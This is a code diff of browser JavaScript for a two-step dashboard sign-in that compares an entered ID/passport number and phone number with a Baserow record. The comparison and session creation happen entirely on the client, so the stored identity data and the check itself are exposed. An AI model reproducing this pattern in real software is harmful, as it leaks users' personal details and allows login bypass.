+  msgEl.innerHTML = "";
+  idEl.classList.remove("err-field");
+  phoneEl.classList.remove("err-field");
+
+  if (!enteredId){
+    msgEl.innerHTML = '<div class="callout err">Please enter your ID / Passport number.</div>';
+    idEl.classList.add("err-field");
+    idEl.focus();
+    return;
+  }
+  if (!enteredPhone){
+    msgEl.innerHTML = '<div class="callout err">Please enter your phone number.</div>';
+    phoneEl.classList.add("err-field");
+    phoneEl.focus();
+    return;
+  }
+
+  btnEl.disabled = true;
+  btnTxt.innerHTML = '<span class="spinner"></span> Verifying…';
+
+  try {
+    /* Pull stored values from the pending Baserow row */
+    const storedId    = normStr(bVal(_pendingRow[FIELDS.idNo]));
+    const storedPhone = normalise(bVal(_pendingRow[FIELDS.Phonenumber]));
+    const inputId     = normStr(enteredId);
+    const inputPhone  = normalise(enteredPhone);
+
+    const idMatch    = storedId    && inputId    && storedId    === inputId;
+    const phoneMatch = storedPhone && inputPhone && storedPhone === inputPhone;
+
+    /* Build clear mismatch message */
+    if (!idMatch || !phoneMatch){
+      let reasons = [];
+      if (!idMatch)    { reasons.push("ID / Passport number"); idEl.classList.add("err-field"); }
+      if (!phoneMatch) { reasons.push("Phone number");         phoneEl.classList.add("err-field"); }
+      const which = reasons.join(" and ");
+      msgEl.innerHTML = `<div class="callout err">❌ ${which} ${reasons.length > 1 ? "do" : "does"} not match our records. Please check and try again.</div>`;
+      btnEl.disabled = false;
+      btnTxt.textContent = "Verify & Sign In";
+      return;
+    }
+
+    /* Both match — create session and show dashboard */
+    const emailEl = document.getElementById("gate-email");
+    const email   = (emailEl.value || bVal(_pendingRow[FIELDS.Email]) || "").trim().toLowerCase();
+    const user    = rowToUser(_pendingRow, { email });
+    Session.set(user);
+    _pendingRow = null;
+    showDashboard();
+    paintHeaderAuth(user);
+    render(user);
+
+    /* Background sync */
+    syncFromBaserow(user).then(fresh => {
+      if (fresh){ render(fresh); paintHeaderAuth(fresh); }
+    });
+
+  } catch(err){
+    msgEl.innerHTML = `<div class="callout err">Verification error: ${err.message}</div>`;
+    btnEl.disabled = false;
+    btnTxt.textContent = "Verify & Sign In";
+  }
+}
+
+/* ── Show/hide step views ── */
+function showStep2(){
+  document.getElementById("step1-wrap").style.display = "none";
+  document.getElementById("step2-wrap").style.display = "";
+  /* Update step dots */
+  document.getElementById("step-dot-1").className = "step-dot done";
+  document.getElementById("step-dot-1").textContent = "✓";
+  document.getElementById("step-line-1").className  = "step-line done";
+  document.getElementById("step-dot-2").className   = "step-dot active";
+  document.getElementById("verify-id").focus();
+}
+
+function backToStep1(){
+  _pendingRow = null;
+  document.getElementById("step1-wrap").style.display = "";
+  document.getElementById("step2-wrap").style.display = "none";
+  document.getElementById("verify-msg").innerHTML = "";
+  document.getElementById("verify-id").value = "";
+  document.getElementById("verify-phone").value = "";
+  document.getElementById("step-dot-1").className  = "step-dot active";
+  document.getElementById("step-dot-1").textContent = "1";
+  document.getElementById("step-line-1").className  = "step-line";
+  document.getElementById("step-dot-2").className   = "step-dot idle";
+  document.getElementById("gate-btn").disabled = false;
+  document.getElementById("gate-btn-text").textContent = "Load my dashboard";
+}
+
+/* Enter key support */
 document.getElementById("gate-email").addEventListener("keydown", e=>{
-  if (e.key === "Enter") gateLogin();
+  if (e.key === "Enter") gateStep1();
+});
+document.addEventListener("keydown", e=>{
+  if (e.key === "Enter"){
+    const s2 = document.getElementById("step2-wrap");
+    if (s2 && s2.style.display !== "none") gateStep2();
+  }
 });
 
-/* ═══════════════════════════════════════════════════════
-   SYNC from Baserow (refresh existing session)
-   ═══════════════════════════════════════════════════════ */
+/* ═══════════════════════════════════════════════════════════════
+   SYNC from Baserow (background refresh)
+   ═══════════════════════════════════════════════════════════════ */
 async function syncFromBaserow(u){
   try {
     let row = null;
@@ -914,18 +1162,16 @@ async function syncFromBaserow(u){
     Session.set(merged);
     return merged;
   } catch(e){
-    console.warn("Baserow sync failed:", e.message);
     return null;
   }
 }
 
-/* ═══════════════════════════════════════════════════════
+/* ═══════════════════════════════════════════════════════════════
    SHOW / HIDE views
-   ═══════════════════════════════════════════════════════ */
-function showDashboard(u){
+   ═══════════════════════════════════════════════════════════════ */
+function showDashboard(){
   document.getElementById("login-gate").style.display = "none";
   document.getElementById("dash-view").style.display  = "";
-  /* Trigger reveal animations */
   setTimeout(()=>{
     document.querySelectorAll(".reveal").forEach(el => el.classList.add("in"));
   }, 80);
@@ -936,9 +1182,9 @@ function showGate(){
   document.getElementById("dash-view").style.display  = "none";
 }
 
-/* ═══════════════════════════════════════════════════════
-   HEADER AUTH buttons
-   ═══════════════════════════════════════════════════════ */
+/* ═══════════════════════════════════════════════════════════════
+   HEADER AUTH
+   ═══════════════════════════════════════════════════════════════ */
 function paintHeaderAuth(u){
   const ctaHTML = u
     ? `<a class="btn btn-ghost" href="dashboard.html">📊 Dashboard</a>
@@ -959,9 +1205,9 @@ function doLogout(){
   location.href = "index.html";
 }
 
-/* ═══════════════════════════════════════════════════════
-   NAV helpers
-   ═══════════════════════════════════════════════════════ */
+/* ═══════════════════════════════════════════════════════════════
+   NAV + UI helpers
+   ═══════════════════════════════════════════════════════════════ */
 document.querySelectorAll("[data-year]").forEach(el => el.textContent = new Date().getFullYear());
 const currentPage = (location.pathname.split("/").pop() || "index.html").toLowerCase();
 document.querySelectorAll("[data-nav]").forEach(a => {
@@ -981,26 +1227,22 @@ document.querySelectorAll("[data-nav]").forEach(a => {
   document.addEventListener("keydown", e=>{ if (e.key==="Escape") close(); });
 })();
 
-/* Logout button inside dashboard sidebar */
+/* Logout button inside sidebar */
 const logoutBtn = document.getElementById("logout");
 if (logoutBtn) logoutBtn.addEventListener("click", e=>{ e.preventDefault(); doLogout(); });
 
-/* ═══════════════════════════════════════════════════════
+/* ═══════════════════════════════════════════════════════════════
    INIT — on page load
-   ═══════════════════════════════════════════════════════ */
+   ═══════════════════════════════════════════════════════════════ */
 (async function init(){
   const u = Session.get();
   paintHeaderAuth(u);
 
   if (u && (u.email || u.rowId)){
-    showDashboard(u);
+    showDashboard();
     render(u);
-    /* Refresh from Baserow in background */
     const fresh = await syncFromBaserow(u);
-    if (fresh){
-      render(fresh);
-      paintHeaderAuth(fresh);
-    }
+    if (fresh){ render(fresh); paintHeaderAuth(fresh); }
   } else {
     showGate();
   }
